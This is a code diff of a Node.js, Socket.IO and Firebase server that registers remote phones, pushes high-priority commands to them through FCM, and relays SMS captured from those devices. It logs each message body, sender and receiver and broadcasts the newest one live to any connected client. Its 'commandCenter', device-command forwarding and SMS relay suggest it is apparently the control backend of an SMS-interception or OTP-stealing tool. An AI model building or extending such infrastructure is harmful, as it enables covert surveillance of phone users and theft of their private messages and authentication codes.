@@ -1,5 +1,5 @@
 // =====================================================
-// server.js  (A-to-Z FINAL + SMS LIVE FIXED)
+// server.js  (A-to-Z FINAL FULL WORKING VERSION)
 // =====================================================
 
 import dotenv from "dotenv";
@@ -25,9 +25,9 @@ const server = createServer(app);
 app.use(cors());
 app.use(express.json());
 
-// -----------------------------------------------------
-// SOCKET.IO
-// -----------------------------------------------------
+/* -----------------------------------------------------
+    SOCKET.IO
+----------------------------------------------------- */
 const io = new Server(server, {
   cors: { origin: "*", methods: ["GET", "POST"] },
 });
@@ -39,9 +39,9 @@ let lastDevicesList = [];
 
 const clean = (id) => id?.toString()?.trim()?.toUpperCase();
 
-// -----------------------------------------------------
-// SEND FCM HIGH PRIORITY
-// -----------------------------------------------------
+/* -----------------------------------------------------
+    SEND FCM HIGH PRIORITY
+----------------------------------------------------- */
 async function sendFcmHighPriority(token, type, payload = {}) {
   if (!token) return;
 
@@ -59,9 +59,9 @@ async function sendFcmHighPriority(token, type, payload = {}) {
   }
 }
 
-// -----------------------------------------------------
-// BUILD DEVICES LIST
-// -----------------------------------------------------
+/* -----------------------------------------------------
+    BUILD DEVICES LIST
+----------------------------------------------------- */
 async function buildDevicesList() {
   const [devSnap, statusSnap] = await Promise.all([
     rtdb.ref("registeredDevices").get(),
@@ -108,9 +108,9 @@ async function refreshDevicesLive(reason = "") {
   }
 }
 
-// -----------------------------------------------------
-// SOCKET CONNECTION
-// -----------------------------------------------------
+/* -----------------------------------------------------
+    SOCKET CONNECTION
+----------------------------------------------------- */
 io.on("connection", (socket) => {
   console.log("🟢 New socket connected:", socket.id);
 
@@ -161,9 +161,9 @@ io.on("connection", (socket) => {
   });
 });
 
-// -----------------------------------------------------
-// SEND COMMAND
-// -----------------------------------------------------
+/* -----------------------------------------------------
+   SEND COMMAND
+----------------------------------------------------- */
 app.post("/send-command", async (req, res) => {
   try {
     const { uniqueid, title, message } = req.body;
@@ -184,9 +184,9 @@ app.post("/send-command", async (req, res) => {
   }
 });
 
-// -----------------------------------------------------
-// CHECK ONLINE + REPLY WATCH
-// -----------------------------------------------------
+/* -----------------------------------------------------
+    CHECK ONLINE + REPLY
+----------------------------------------------------- */
 const liveReplyWatchers = new Map();
 
 function stopReplyWatcher(uid) {
@@ -247,9 +247,9 @@ app.get("/api/brosreply/:uid", async (req, res) => {
   }
 });
 
-// -----------------------------------------------------
-// DEVICE COMMAND FORWARD
-// -----------------------------------------------------
+/* -----------------------------------------------------
+    DEVICE COMMAND FORWARD
+----------------------------------------------------- */
 function extractCommandData(raw) {
   if (raw?.action) return raw;
   const keys = Object.keys(raw || {});
@@ -266,6 +266,7 @@ async function handleDeviceCommandChange(snap) {
 
   const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
   const token = devSnap.val()?.fcmToken;
+
   if (!token) {
     console.log("⚠️ DEVICE_COMMAND: No token for", uid);
     return;
@@ -279,149 +280,65 @@ async function handleDeviceCommandChange(snap) {
   });
 }
 
-rtdb
-  .ref("commandCenter/deviceCommands")
+rtdb.ref("commandCenter/deviceCommands")
   .on("child_added", handleDeviceCommandChange);
-rtdb
-  .ref("commandCenter/deviceCommands")
+rtdb.ref("commandCenter/deviceCommands")
   .on("child_changed", handleDeviceCommandChange);
 
-// -----------------------------------------------------
-// CHECK ONLINE SYSTEM
-// -----------------------------------------------------
-async function handleCheckOnlineChange(snap) {
-  if (!snap.exists()) return;
-
-  const uid = snap.key;
-  const data = snap.val() || {};
-  const now = Date.now();
-
-  console.log("📡 CHECK_ONLINE CHANGE → uid=", uid, " data=", data);
-
-  await rtdb.ref(`resetCollection/${uid}`).set({
-    resetAt: now,
-    readable: new Date(now).toString(),
-  });
-
-  await rtdb.ref(`status/${uid}`).update({
-    connectivity: "Online",
-    lastSeen: now,
-    timestamp: now,
-  });
-
-  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
-  const token = devSnap.val()?.fcmToken;
-  if (!token) {
-    console.log("⚠️ CHECK_ONLINE: No token for", uid);
-    return;
-  }
-
-  await sendFcmHighPriority(token, "CHECK_ONLINE", {
-    uniqueid: uid,
-    available: data.available || "unknown",
-    checkedAt: String(data.checkedAt || ""),
-  });
-}
-
-const checkOnlineRef = rtdb.ref("checkOnline");
-checkOnlineRef.on("child_added", handleCheckOnlineChange);
-checkOnlineRef.on("child_changed", handleCheckOnlineChange);
-
-// -----------------------------------------------------
-// 🔔 SMS LIVE HELPERS (1-LEVEL + 2-LEVEL SUPPORT)
-// -----------------------------------------------------
+/* -----------------------------------------------------
+    SMS LIVE SYSTEM (FINAL WORKING)
+----------------------------------------------------- */
 const SMS_NODE = "smsNotifications";
 
+console.log("👂 Listening on smsNotifications (1-level mode)");
+
 function normalizeSmsListForUid(uid, rawNode) {
-  // rawNode can be:
-  // 1) { msgId: {body, timestamp, ...} }
-  // 2) { groupId: { msgId: {body, timestamp, ...} } }
-  const list = [];
+  const final = [];
 
-  if (!rawNode || typeof rawNode !== "object") return list;
+  if (!rawNode || typeof rawNode !== "object") return final;
 
-  Object.entries(rawNode).forEach(([k1, v1]) => {
-    if (v1 && typeof v1 === "object") {
-      const looksLikeSms =
-        "body" in v1 ||
-        "message" in v1 ||
-        "text" in v1 ||
-        "timestamp" in v1 ||
-        "date" in v1;
-
-      if (looksLikeSms) {
-        // pattern 1 → directly an sms
-        list.push({
-          id: k1,
-          uniqueid: uid,
-          ...v1,
-        });
-      } else {
-        // pattern 2 → second level objects
-        Object.entries(v1).forEach(([k2, v2]) => {
-          if (v2 && typeof v2 === "object") {
-            list.push({
-              id: k2,
-              uniqueid: uid,
-              ...v2,
-            });
-          }
-        });
-      }
+  Object.entries(rawNode).forEach(([msgId, smsObj]) => {
+    if (smsObj && typeof smsObj === "object") {
+      final.push({
+        id: msgId,
+        uniqueid: uid,
+        ...smsObj,
+      });
     }
   });
 
-  return list;
+  return final;
 }
 
-// -----------------------------------------------------
-// SMS LIVE LAST MESSAGE ONLY  (WITH LOGS)
-// -----------------------------------------------------
-const smsRef = rtdb.ref(SMS_NODE);
-
-console.log("👂 ATTACHING LISTENER ON NODE:", SMS_NODE);
-
-smsRef.on("child_added", handleSmsChange);
-smsRef.on("child_changed", handleSmsChange);
-
-async function handleSmsChange(snap) {
+function handleSmsChange(snap) {
   const uid = snap.key;
-  const raw = snap.val() || {};
+  const node = snap.val() || {};
 
-  const smsList = normalizeSmsListForUid(uid, raw);
+  console.log("📡 SMS CHANGE DETECTED → uid=", uid, " keys=", Object.keys(node));
 
-  console.log(
-    "📡 SMS NODE CHANGE → uid=",
-    uid,
-    " totalSmsFound=",
-    smsList.length,
-    " rawKeys=",
-    Object.keys(raw || {})
-  );
+  const list = normalizeSmsListForUid(uid, node);
 
-  if (!smsList.length) {
-    console.log("⚠️ No SMS found for uid=", uid);
+  if (!list.length) {
+    console.log("⚠️ No SMS found in node →", uid);
     return;
   }
 
-  // pick latest by timestamp (fallback lexicographic)
-  smsList.sort((a, b) => {
-    const ta = Number(a.timestamp || a.date || 0);
-    const tb = Number(b.timestamp || b.date || 0);
+  list.sort((a, b) => {
+    const ta = new Date(a.timestamp).getTime() || 0;
+    const tb = new Date(b.timestamp).getTime() || 0;
     return tb - ta;
   });
 
-  const latest = smsList[0];
+  const latest = list[0];
 
   console.log(
-    "📨 smsLogsAllLive EMIT → uid=",
-    uid,
-    " msgId=",
-    latest.id,
-    " phone=",
-    latest.address || latest.from || latest.phone || "",
-    " ts=",
-    latest.timestamp || latest.date || ""
+    "📨 EMITTING LIVE SMS →",
+    "\n UID:", uid,
+    "\n MSG-ID:", latest.id,
+    "\n BODY:", latest.body,
+    "\n RECEIVER:", latest.receiverNumber,
+    "\n SENDER:", latest.sender,
+    "\n TS:", latest.timestamp
   );
 
   io.emit("smsLogsAllLive", {
@@ -432,9 +349,13 @@ async function handleSmsChange(snap) {
   });
 }
 
-// -----------------------------------------------------
-// REGISTERED DEVICES LIVE
-// -----------------------------------------------------
+const smsRef = rtdb.ref(SMS_NODE);
+smsRef.on("child_added", handleSmsChange);
+smsRef.on("child_changed", handleSmsChange);
+
+/* -----------------------------------------------------
+    REGISTERED DEVICES LIVE
+----------------------------------------------------- */
 const registeredDevicesRef = rtdb.ref("registeredDevices");
 
 registeredDevicesRef.on("child_added", () => {
@@ -464,22 +385,25 @@ app.get("/api/devices", async (req, res) => {
 
 refreshDevicesLive("initial");
 
-// -----------------------------------------------------
-// ROUTES MOUNTING
-// -----------------------------------------------------
-app.use("/api/sms", smsRoutes); // /api/sms/all etc.
+/* -----------------------------------------------------
+    ROUTES MOUNTING
+----------------------------------------------------- */
+app.use("/api/sms", smsRoutes);
 app.use(adminRoutes);
 app.use("/api", checkRoutes);
 app.use("/api", userFullDataRoutes);
 app.use(commandRoutes);
 
-// -----------------------------------------------------
-// ROOT + LISTEN
-// -----------------------------------------------------
+/* -----------------------------------------------------
+    ROOT
+----------------------------------------------------- */
 app.get("/", (_, res) => {
   res.send("RTDB + Socket.IO Backend Running");
 });
 
+/* -----------------------------------------------------
+    LISTEN
+----------------------------------------------------- */
 server.listen(PORT, () => {
   console.log("🚀 SERVER RUNNING ON PORT", PORT);
 });
